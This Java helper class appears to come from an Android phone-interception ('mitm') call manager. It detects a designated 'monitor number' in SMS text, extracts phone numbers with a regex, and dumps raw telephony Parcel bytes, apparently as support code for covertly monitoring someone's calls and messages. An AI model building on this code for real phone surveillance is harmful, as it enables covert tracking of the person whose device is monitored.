package com.vvt.callmanager.mitm;

import java.util.HashSet;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.os.Parcel;

import com.vvt.telephony.TelephonyUtils;

public class MitmHelper {
	
	public static final String PREFIX_REQUEST = "O->T";
	public static final String PREFIX_RESPONSE = "O<=T";
	
	public static boolean doesSmsContainsMonitorNumber(String smsMessageBody, String monitorNumber) {
		String[] numbers = extractPhoneNumberFromMessage(smsMessageBody);
		
		for (String number : numbers) {
			if (TelephonyUtils.isSamePhoneNumber(monitorNumber, number, 5)) {
				return true;
			}
		}
		return false;
	}
	
	public static String getDisplayString(Parcel p) {
		byte[] data = p.marshall();
		StringBuilder builder = new StringBuilder();
		
		for (int i = 0; i < data.length; i++) {
			if (i > 0) builder.append(", ");
			builder.append(data[i] & 0xFF);
		}
		
		return builder.toString();
	}

	private static String[] extractPhoneNumberFromMessage(String smsMessageBody) {
		HashSet<String> numbers = new HashSet<String>();
		
		Pattern p = Pattern.compile("[+]{0,1}([ ]*[-]*[0-9]){3,}");
		Matcher m = p.matcher(smsMessageBody);
		
		String number = null;
		while(m.find()) {
			number = smsMessageBody.substring(m.start(), m.end()).trim();
			numbers.add(number);
		}
		return numbers.toArray(new String[numbers.size()]);
	}
}
